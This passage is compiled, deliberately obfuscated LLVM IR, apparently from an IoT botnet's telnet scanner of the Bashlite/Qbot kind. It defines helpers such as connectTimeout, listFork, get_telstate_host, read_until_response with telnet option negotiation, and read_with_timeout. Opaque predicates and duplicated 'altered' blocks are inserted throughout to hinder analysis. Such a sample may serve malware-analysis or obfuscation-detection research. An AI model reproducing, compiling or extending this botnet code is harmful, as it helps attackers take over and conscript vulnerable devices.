  br i1 %236, label %originalBBpart248, label %originalBB30alteredBB

originalBBpart248:                                ; preds = %originalBB30
  br label %168

; <label>:237:                                    ; preds = %originalBBpart228, %168
  %238 = load i8*, i8** %17, align 8
  store i8 0, i8* %238, align 1
  %239 = load i32, i32* %18, align 4
  store i32 %239, i32* %4, align 4
  br label %240

; <label>:240:                                    ; preds = %237, %originalBBpart224
  %241 = load i32, i32* %4, align 4
  ret i32 %241

originalBBalteredBB:                              ; preds = %originalBB, %24
  %242 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %243 = getelementptr inbounds [16 x i64], [16 x i64]* %242, i64 0, i64 0
  %244 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %243) #3, !srcloc !1
  %245 = extractvalue { i64, i64* } %244, 0
  %246 = extractvalue { i64, i64* } %244, 1
  %247 = trunc i64 %245 to i32
  store i32 %247, i32* %10, align 4
  %248 = ptrtoint i64* %246 to i64
  %249 = trunc i64 %248 to i32
  store i32 %249, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  %250 = load i32, i32* %13, align 4
  %251 = icmp slt i32 %250, 10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %85
  %252 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %252, align 8
  %253 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %253, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %129
  %254 = load i32, i32* %13, align 4
  %_ = shl i32 %254, 1
  %_11 = sub i32 %254, 1
  %gen = mul i32 %_11, 1
  %_12 = shl i32 %254, 1
  %_13 = sub i32 0, %254
  %gen14 = add i32 %_13, 1
  %255 = add nsw i32 %254, 1
  store i32 %255, i32* %13, align 4
  br label %originalBB10

originalBB18alteredBB:                            ; preds = %originalBB18, %150
  store i32 0, i32* %18, align 4
  %256 = load i8*, i8** %6, align 8
  store i8* %256, i8** %17, align 8
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %176
  %257 = load i8*, i8** %17, align 8
  store i8 0, i8* %257, align 1
  store i32 -1, i32* %4, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %201
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %218
  %258 = load i32, i32* %18, align 4
  %_31 = sub i32 %258, 1
  %gen32 = mul i32 %_31, 1
  %_33 = sub i32 %258, 1
  %gen34 = mul i32 %_33, 1
  %_35 = sub i32 %258, 1
  %gen36 = mul i32 %_35, 1
  %_37 = sub i32 %258, 1
  %gen38 = mul i32 %_37, 1
  %_39 = sub i32 %258, 1
  %gen40 = mul i32 %_39, 1
  %_41 = sub i32 0, %258
  %gen42 = add i32 %_41, 1
  %_43 = sub i32 0, %258
  %gen44 = add i32 %_43, 1
  %_45 = sub i32 %258, 1
  %gen46 = mul i32 %_45, 1
  %259 = add nsw i32 %258, 1
  store i32 %259, i32* %18, align 4
  br label %originalBB30
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %164

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %155

; <label>:45:                                     ; preds = %37
  %46 = load i32, i32* @x.41
  %47 = load i32, i32* @y.42
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %45
  %54 = call i32* @__errno_location() #10
  %55 = load i32, i32* %54, align 4
  %56 = icmp eq i32 %55, 115
  %57 = load i32, i32* @x.41
  %58 = load i32, i32* @y.42
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %65, label %153

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* @x.41
  %67 = load i32, i32* @y.42
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i32, i32* %9, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %75, i64* %76, align 8
  %77 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %77, align 8
  %78 = load i32, i32* @x.41
  %79 = load i32, i32* @y.42
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %86

; <label>:86:                                     ; preds = %originalBBpart24
  %87 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %87, i64 0, i64 0
  %89 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %88) #3, !srcloc !3
  %90 = extractvalue { i64, i64* } %89, 0
  %91 = extractvalue { i64, i64* } %89, 1
  %92 = trunc i64 %90 to i32
  store i32 %92, i32* %17, align 4
  %93 = ptrtoint i64* %91 to i64
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %18, align 4
  br label %95

; <label>:95:                                     ; preds = %86
  %96 = load i32, i32* %6, align 4
  %97 = srem i32 %96, 64
  %98 = zext i32 %97 to i64
  %99 = shl i64 1, %98
  %100 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %101 = load i32, i32* %6, align 4
  %102 = sdiv i32 %101, 64
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [16 x i64], [16 x i64]* %100, i64 0, i64 %103
  %105 = load i64, i64* %104, align 8
  %106 = or i64 %105, %99
  store i64 %106, i64* %104, align 8
  %107 = load i32, i32* %6, align 4
  %108 = add nsw i32 %107, 1
  %109 = call i32 @select(i32 %108, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %110 = icmp sgt i32 %109, 0
  br i1 %110, label %111, label %135

; <label>:111:                                    ; preds = %95
  store i32 4, i32* %13, align 4
  %112 = load i32, i32* %6, align 4
  %113 = bitcast i32* %14 to i8*
  %114 = call i32 @getsockopt(i32 %112, i32 1, i32 4, i8* %113, i32* %13) #3
  %115 = load i32, i32* %14, align 4
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %117, label %134

; <label>:117:                                    ; preds = %111
  %118 = load i32, i32* @x.41
  %119 = load i32, i32* @y.42
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %117
  store i32 0, i32* %5, align 4
  %126 = load i32, i32* @x.41
  %127 = load i32, i32* @y.42
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %164

; <label>:134:                                    ; preds = %111
  br label %136

; <label>:135:                                    ; preds = %95
  store i32 0, i32* %5, align 4
  br label %164

; <label>:136:                                    ; preds = %134
  %137 = load i32, i32* @x.41
  %138 = load i32, i32* @y.42
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %136
  %145 = load i32, i32* @x.41
  %146 = load i32, i32* @y.42
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %154

; <label>:153:                                    ; preds = %originalBBpart2
  store i32 0, i32* %5, align 4
  br label %164

; <label>:154:                                    ; preds = %originalBBpart212
  br label %155

; <label>:155:                                    ; preds = %154, %37
  %156 = load i32, i32* %6, align 4
  %157 = call i32 (i32, i32, ...) @fcntl(i32 %156, i32 3, i8* null)
  %158 = sext i32 %157 to i64
  store i64 %158, i64* %15, align 8
  %159 = load i64, i64* %15, align 8
  %160 = and i64 %159, -2049
  store i64 %160, i64* %15, align 8
  %161 = load i32, i32* %6, align 4
  %162 = load i64, i64* %15, align 8
  %163 = call i32 (i32, i32, ...) @fcntl(i32 %161, i32 4, i64 %162)
  store i32 1, i32* %5, align 4
  br label %164

; <label>:164:                                    ; preds = %155, %153, %135, %originalBBpart28, %36
  %165 = load i32, i32* %5, align 4
  ret i32 %165

originalBBalteredBB:                              ; preds = %originalBB, %45
  %166 = call i32* @__errno_location() #10
  %167 = load i32, i32* %166, align 4
  %168 = icmp eq i32 %167, 115
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %170, i64* %171, align 8
  %172 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %172, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %117
  store i32 0, i32* %5, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %136
  br label %originalBB10
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #3
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %79

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #3
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %originalBBpart215, %10
  %19 = load i32, i32* @x.43
  %20 = load i32, i32* @y.44
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* %4, align 4
  %28 = zext i32 %27 to i64
  %29 = load i64, i64* @numpids, align 8
  %30 = sub i64 %29, 1
  %31 = icmp ult i64 %28, %30
  %32 = load i32, i32* @x.43
  %33 = load i32, i32* @y.44
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %31, label %40, label %69

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i32*, i32** @pids, align 8
  %42 = load i32, i32* %4, align 4
  %43 = zext i32 %42 to i64
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  %45 = load i32, i32* %44, align 4
  %46 = load i32*, i32** %3, align 8
  %47 = load i32, i32* %4, align 4
  %48 = zext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 %45, i32* %49, align 4
  br label %50

; <label>:50:                                     ; preds = %40
  %51 = load i32, i32* @x.43
  %52 = load i32, i32* @y.44
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = load i32, i32* %4, align 4
  %60 = add i32 %59, 1
  store i32 %60, i32* %4, align 4
  %61 = load i32, i32* @x.43
  %62 = load i32, i32* @y.44
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br label %18

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load i32, i32* %2, align 4
  %71 = load i32*, i32** %3, align 8
  %72 = load i64, i64* @numpids, align 8
  %73 = sub i64 %72, 1
  %74 = getelementptr inbounds i32, i32* %71, i64 %73
  store i32 %70, i32* %74, align 4
  %75 = load i32*, i32** @pids, align 8
  %76 = bitcast i32* %75 to i8*
  call void @free(i8* %76) #3
  %77 = load i32*, i32** %3, align 8
  store i32* %77, i32** @pids, align 8
  %78 = load i32, i32* %2, align 4
  store i32 %78, i32* %1, align 4
  br label %79

; <label>:79:                                     ; preds = %69, %8
  %80 = load i32, i32* @x.43
  %81 = load i32, i32* @y.44
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %79
  %88 = load i32, i32* %1, align 4
  %89 = load i32, i32* @x.43
  %90 = load i32, i32* @y.44
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  ret i32 %88

originalBBalteredBB:                              ; preds = %originalBB, %18
  %97 = load i32, i32* %4, align 4
  %98 = zext i32 %97 to i64
  %99 = load i64, i64* @numpids, align 8
  %100 = sub i64 %99, 1
  %101 = icmp ult i64 %98, %100
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %102 = load i32, i32* %4, align 4
  %_ = sub i32 0, %102
  %gen = add i32 %_, 1
  %_2 = sub i32 %102, 1
  %gen3 = mul i32 %_2, 1
  %_4 = sub i32 %102, 1
  %gen5 = mul i32 %_4, 1
  %_6 = sub i32 %102, 1
  %gen7 = mul i32 %_6, 1
  %_8 = sub i32 %102, 1
  %gen9 = mul i32 %_8, 1
  %_10 = sub i32 %102, 1
  %gen11 = mul i32 %_10, 1
  %_12 = sub i32 0, %102
  %gen13 = add i32 %_12, 1
  %103 = add i32 %102, 1
  store i32 %103, i32* %4, align 4
  br label %originalBB1

originalBB17alteredBB:                            ; preds = %originalBB17, %79
  %104 = load i32, i32* %1, align 4
  br label %originalBB17
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #3
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = load i32, i32* @x.47
  %7 = load i32, i32* @y.48
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %15, align 4
  store i32 %1, i32* %16, align 4
  store i8* %2, i8** %17, align 8
  store i32 %3, i32* %18, align 4
  store i8** %4, i8*** %19, align 8
  %22 = load i8*, i8** %17, align 8
  %23 = load i32, i32* %18, align 4
  %24 = sext i32 %23 to i64
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 %24, i32 1, i1 false)
  %25 = load i32, i32* %15, align 4
  %26 = load i32, i32* %16, align 4
  %27 = load i8*, i8** %17, align 8
  %28 = load i32, i32* %18, align 4
  %29 = call i32 @read_with_timeout(i32 %25, i32 %26, i8* %27, i32 %28)
  store i32 %29, i32* %20, align 4
  %30 = load i8*, i8** %17, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 0
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 255
  %35 = load i32, i32* @x.47
  %36 = load i32, i32* @y.48
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %47

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* %15, align 4
  %45 = load i8*, i8** %17, align 8
  %46 = call i32 @negotiate(i32 %44, i8* %45, i32 3)
  br label %47

; <label>:47:                                     ; preds = %43, %originalBBpart2
  %48 = load i8*, i8** %17, align 8
  %49 = load i8**, i8*** %19, align 8
  %50 = call i32 @contains_string(i8* %48, i8** %49)
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %47
  store i32 1, i32* %14, align 4
  br label %70

; <label>:53:                                     ; preds = %47
  %54 = load i32, i32* @x.47
  %55 = load i32, i32* @y.48
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  store i32 0, i32* %14, align 4
  %62 = load i32, i32* @x.47
  %63 = load i32, i32* @y.48
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %70

; <label>:70:                                     ; preds = %originalBBpart24, %52
  %71 = load i32, i32* @x.47
  %72 = load i32, i32* @y.48
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %70
  %79 = load i32, i32* %14, align 4
  %80 = load i32, i32* @x.47
  %81 = load i32, i32* @y.48
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %79

originalBBalteredBB:                              ; preds = %originalBB, %5
  %88 = alloca i32, align 4
  %89 = alloca i32, align 4
  %90 = alloca i32, align 4
  %91 = alloca i8*, align 8
  %92 = alloca i32, align 4
  %93 = alloca i8**, align 8
  %94 = alloca i32, align 4
  %95 = alloca i32, align 4
  store i32 %0, i32* %89, align 4
  store i32 %1, i32* %90, align 4
  store i8* %2, i8** %91, align 8
  store i32 %3, i32* %92, align 4
  store i8** %4, i8*** %93, align 8
  %96 = load i8*, i8** %91, align 8
  %97 = load i32, i32* %92, align 4
  %98 = sext i32 %97 to i64
  call void @llvm.memset.p0i8.i64(i8* %96, i8 0, i64 %98, i32 1, i1 false)
  %99 = load i32, i32* %89, align 4
  %100 = load i32, i32* %90, align 4
  %101 = load i8*, i8** %91, align 8
  %102 = load i32, i32* %92, align 4
  %103 = call i32 @read_with_timeout(i32 %99, i32 %100, i8* %101, i32 %102)
  store i32 %103, i32* %94, align 4
  %104 = load i8*, i8** %91, align 8
  %105 = getelementptr inbounds i8, i8* %104, i64 0
  %106 = load i8, i8* %105, align 1
  %107 = sext i8 %106 to i32
  %108 = icmp eq i32 %107, 255
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  store i32 0, i32* %14, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %70
  %109 = load i32, i32* %14, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #3, !srcloc !4
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %51

; <label>:44:                                     ; preds = %27
  %45 = load i32, i32* %6, align 4
  %46 = load i8*, i8** %8, align 8
  %47 = load i32, i32* %9, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @recv(i32 %45, i8* %46, i64 %48, i32 0)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %5, align 4
  br label %51

; <label>:51:                                     ; preds = %44, %43
  %52 = load i32, i32* %5, align 4
  ret i32 %52
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
